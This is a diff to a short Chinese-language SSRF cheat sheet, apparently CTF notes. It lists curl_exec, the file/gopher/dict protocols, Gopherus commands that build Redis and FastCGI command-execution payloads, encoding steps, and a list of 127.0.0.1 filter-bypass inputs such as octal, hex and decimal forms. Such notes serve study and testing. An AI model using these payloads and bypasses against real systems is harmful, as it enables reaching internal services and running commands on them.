@@ -1,6 +1,20 @@
+涉及函数
+
+```php
+curl_exec() curl_exec函数⽤于执⾏指定的cURL会话。
+```
+
+## 涉及协议
+
+```bash
+file://
+gopher://     #gopher://<host>:<port>/<gopher-path>
+dict:// # dict://127.0.0.1:6379 //探测redis是否存活
+```
+
 ## gopher
 
-生成的 payload 再次 url 编码，然后使用
+如果 redis 有验证用 `gophper-redis-auth.py`
 
 ```sh
 python2 gopherus.py --exploit fastcgi
@@ -9,4 +23,21 @@ python2 gopherus.py --exploit fastcgi
 python2 gopherus.py --exploit redis
 参数1： php
 参数2cmd: ls
+```
+
+- 生成的 payload 再次 url 编码,
+- encode all special chars (Cyberchef) 再使用
+
+## 127.0.0.1 绕过
+
+```bash
+url=http://xxx@127.0.0.1
+1②7.0.0.1
+127。 0。 0。 1
+127.1
+0177.0.0.1 //⼋进制
+0x7f.0.0.1 //⼗六进制
+2130706433 //⼗进制
+url=http://0/flag.php
+0.0.0.0
 ```
